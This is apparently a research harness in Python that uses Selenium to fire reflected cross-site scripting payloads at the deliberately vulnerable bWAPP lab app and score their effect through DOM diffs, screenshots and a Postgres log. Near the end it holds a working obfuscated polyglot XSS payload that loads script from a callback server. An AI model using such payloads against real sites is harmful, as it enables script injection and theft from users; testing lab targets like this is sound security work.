import uuid
from typing import Callable
from bs4 import BeautifulSoup
from deepdiff import DeepDiff
from seleniumwire import webdriver
from payloads import *
import psycopg2
import cv2
import numpy as np


from bwapp_selenium_actions import *

def print_diff(diff: DeepDiff):
    print(diff.keys())
    if 'iterable_item_removed' in diff:
        print("---- ITEMS REMOVE EXPECTED ----")
        print(diff['iterable_item_removed'].keys())
    if 'iterable_item_added' in diff:
        print("---- ITEMS ADD EXPECTED ----")
        print(diff['iterable_item_added'].keys())
    if 'values_changed' in diff:
        print("---- ITEMS CHANGE EXPECTED ----")
        print(diff['values_changed'].keys())

'''
:return result: a dict of sets with positions, where a diff appeared either in @diff_payload or @diff_expected; empty if both are equal
'''
def compare_diffs(diff_payload: DeepDiff, diff_expected: DeepDiff):
    result = dict()
    for key in ['iterable_item_removed', 'iterable_item_added', 'values_changed']:
        if key in diff_payload:
            if key in diff_expected:
                set_expected = set(diff_expected[key].keys())
                set_actual = set(diff_payload[key].keys())
                result[key] = set_expected ^ set_actual
            else:
                result[key] = set(diff_payload[key].keys())
        elif key in diff_expected:
            result[key] = set(diff_expected[key].keys())
    return result

def compare_images(img_str1, img_str2):
    img1 = cv2.imread(img_str1)
    img2 = cv2.imread(img_str2)
    diff = np.sum((img1 - img2) ** 2) # calc medium squared error
    print("IMAGES: ", diff)

def single_experiment(driver: webdriver, payloads: list[str], experiment_function: Callable[[webdriver, str, str], str]) -> any:
    # set login cookie for driver
    login(driver, BWAPP_URL)
    driver.maximize_window()

    # test which differences appear when the payload changes between "normal" strings
    uuid_1 = str(uuid.uuid4())
    uuid_2 = str(uuid.uuid4())
    while uuid_1 == uuid_2: uuid_1 = str(uuid.uuid4())
    html_uuid_1 = experiment_function(driver, BWAPP_URL, uuid_1)
    driver.save_screenshot("out-" + "expected-1" + ".png")
    html_uuid_2 = experiment_function(driver, BWAPP_URL, uuid_2)
    driver.save_screenshot("out-" + "expected-2" + ".png")

    compare_images("out-expected-1.png", "out-expected-2.png")

    soup_uuid_1 = BeautifulSoup(html_uuid_1, "html.parser")
    soup_uuid_2 = BeautifulSoup(html_uuid_2, "html.parser")

    expected_diff = DeepDiff(soup_uuid_1, soup_uuid_2)
    print_diff(expected_diff)

    conn = psycopg2.connect(
        host=DB_HOST,
        port=DB_PORT,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASS
    )

    # generate diffs for each payload and compare to the expected diff, save differences
    for payload in payloads:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO xss_eval (payload, attacked_path) VALUES (%s, %s)",
                    (payload, experiment_function.__name__))
        conn.commit()
        cursor.execute("SELECT id, payload, attacked_path FROM xss_eval WHERE payload = %s AND attacked_path = %s ORDER BY id DESC", (payload, experiment_function.__name__))
        experiment_id = cursor.fetchone()[0]
        payload = payload.replace("<id>", str(experiment_id))
        print(payload)
        html_payload = experiment_function(driver, BWAPP_URL, payload)
        soup_payload = BeautifulSoup(html_payload, "html.parser")
        diff_payload = DeepDiff(soup_uuid_1, soup_payload)
        result = compare_diffs(diff_payload, expected_diff)

        #driver = webdriver.Chrome()

        driver.save_screenshot("out-" + str(experiment_id) + ".png")
        compare_images("out-expected-1.png", "out-" + str(experiment_id) + ".png")

        print("LOGS: ", driver.get_log("browser"))
        for req in reversed(driver.requests):
            if ".php" in req.path:
                print("CODE: ", req.response.status_code)
                break

        cursor.execute("UPDATE xss_eval SET impact = %s WHERE id = %s", (str(result), experiment_id))
        conn.commit()
        print(result)

    driver.quit()

payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]

if __name__ == '__main__':
    driver = webdriver.Chrome()
    #single_experiment(driver, payloads, xss_reflected_eval)
    single_experiment(driver, payloads, xss_reflected_get_firstname)